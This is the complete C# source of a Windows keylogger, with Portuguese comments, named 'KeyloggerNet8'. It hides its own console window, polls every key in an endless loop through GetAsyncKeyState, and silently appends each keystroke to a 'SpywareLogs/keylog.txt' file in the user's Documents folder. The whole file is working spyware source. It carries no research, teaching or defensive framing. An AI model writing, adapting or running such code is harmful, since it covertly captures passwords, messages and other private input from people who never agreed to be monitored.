using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyloggerNet8
{
    class Program
    {
        // Importa a função para mostrar ou ocultar a janela
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;      // Para ocultar a janela
        const int SW_MINIMIZE = 6;  // Para minimizar a janela

        // Importa a função GetAsyncKeyState da biblioteca user32.dll
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetAsyncKeyState(int vkey);

        static void Main(string[] args)
        {
            // Minimiza a janela do console
            var handle = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(handle, SW_HIDE);  // Oculta a janela do console

            // Obtém o caminho da pasta Documentos do usuário
            string documentsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SpywareLogs");

            // Verifica se a pasta "SpywareLogs" existe, se não existir, cria a pasta
            if (!Directory.Exists(documentsPath))
            {
                Directory.CreateDirectory(documentsPath);
            }

            // Define o caminho completo para o arquivo keylog.txt
            string filePath = Path.Combine(documentsPath, "keylog.txt");

            // Loop infinito para capturar as teclas pressionadas
            while (true)
            {
                for (int keyCode = 8; keyCode <= 255; keyCode++) // Percorre as teclas
                {
                    int keyState = GetAsyncKeyState(keyCode);

                    if (keyState == 1 || keyState == -32767) // Verifica se a tecla foi pressionada
                    {
                        string keyPressed = ConvertKeyCodeToReadableFormat(keyCode);

                        // Grava a tecla no arquivo
                        using (StreamWriter sw = new StreamWriter(filePath, true))
                        {
                            sw.Write(keyPressed);
                        }
                    }
                }

                Thread.Sleep(10); // Pausa breve para não sobrecarregar a CPU
            }
        }

        // Função para converter o código da tecla em um formato legível
        static string ConvertKeyCodeToReadableFormat(int keyCode)
        {
            switch (keyCode)
            {
                case 8:
                    return "[BACKSPACE]";
                case 9:
                    return "[TAB]";
                case 13:
                    return "[ENTER]";
                case 32:
                    return " "; // Espaço
                case 27:
                    return "[ESC]";
                case 46:
                    return "[DELETE]";
                default:
                    return ((char)keyCode).ToString(); // Converte o código da tecla para caractere
            }
        }
    }
}
